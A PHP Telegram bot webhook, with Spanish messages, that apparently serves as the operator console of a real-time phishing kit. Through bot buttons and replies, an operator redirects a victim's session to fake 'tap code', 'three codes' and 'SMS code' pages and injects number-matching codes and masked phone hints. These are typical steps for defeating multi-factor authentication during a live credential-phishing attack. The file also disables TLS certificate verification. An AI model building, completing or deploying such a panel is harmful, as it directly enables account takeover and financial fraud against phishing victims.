<?php
require_once __DIR__ . '/config.php';
$botToken = TELEGRAM_BOT_TOKEN;

function sendTelegramRequest($botToken, $method, $params) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/$method");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['callback_query'])) {
    $cb = $update['callback_query'];
    $data = $cb['data'] ?? '';
    $chatId = $cb['message']['chat']['id'] ?? '';
    sendTelegramRequest($botToken, 'answerCallbackQuery', ['callback_query_id' => $cb['id']]);

    if (strpos($data, 'redirect:') === 0) {
        $parts = explode(':', $data);
        $page = preg_replace('/[^a-zA-Z0-9_]/', '', $parts[1] ?? '');
        $sessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $parts[2] ?? '');
        
        if ($sessionId && $page) {
            $sessionData = getSessionData($sessionId);
            $sessionData['redirect'] = $page;
            updateSessionData($sessionId, $sessionData);
            
            sendTelegramRequest($botToken, 'sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ Redirigiendo a <b>$page</b>...",
                'parse_mode' => 'HTML'
            ]);
        }
    } elseif (strpos($data, 'input:') === 0) {
        $parts = explode(':', $data);
        $inputType = $parts[1] ?? '';
        $sessionId = $parts[2] ?? '';
        
        if ($sessionId && $inputType) {
            setAdminState($chatId, ['waiting_for' => $inputType, 'session_id' => $sessionId]);
            $prompts = [
                'tap' => "🔢 Escribe el código de 2 dígitos (ej. 72):",
                'three' => "🔢 Escribe los 3 códigos (ej. 6-1-9):",
                'phone' => "📱 Escribe el teléfono (ej. ***-***-1234):"
            ];
            sendTelegramRequest($botToken, 'sendMessage', [
                'chat_id' => $chatId,
                'text' => $prompts[$inputType] ?? "Ingresa el valor:",
                'reply_markup' => json_encode(['force_reply' => true])
            ]);
        }
    }
} elseif (isset($update['message'])) {
    $chatId = $update['message']['chat']['id'];
    $text = $update['message']['text'] ?? '';

    if ($text === '/start') {
        sendTelegramRequest($botToken, 'sendMessage', ['chat_id' => $chatId, 'text' => "Bot listo."]);
    } else {
        $adminState = getAdminState($chatId);
        if ($adminState && isset($adminState['waiting_for'])) {
            $inputType = $adminState['waiting_for'];
            $sessionId = $adminState['session_id'];
            clearAdminState($chatId);

            $sessionData = getSessionData($sessionId);
            if ($inputType === 'tap') {
                $sessionData['tap_code_value'] = $text;
                $sessionData['redirect'] = 'tap_code';
            } elseif ($inputType === 'three') {
                $sessionData['three_codes_value'] = $text;
                $sessionData['redirect'] = 'three_codes';
            } elseif ($inputType === 'phone') {
                $sessionData['phone_display'] = $text;
                $sessionData['redirect'] = 'sms_code';
            }
            
            updateSessionData($sessionId, $sessionData);
            sendTelegramRequest($botToken, 'sendMessage', ['chat_id' => $chatId, 'text' => "✅ Dato guardado. Redirigiendo usuario..."]);
        }
    }
}
http_response_code(200);
echo json_encode(['ok' => true]);
?>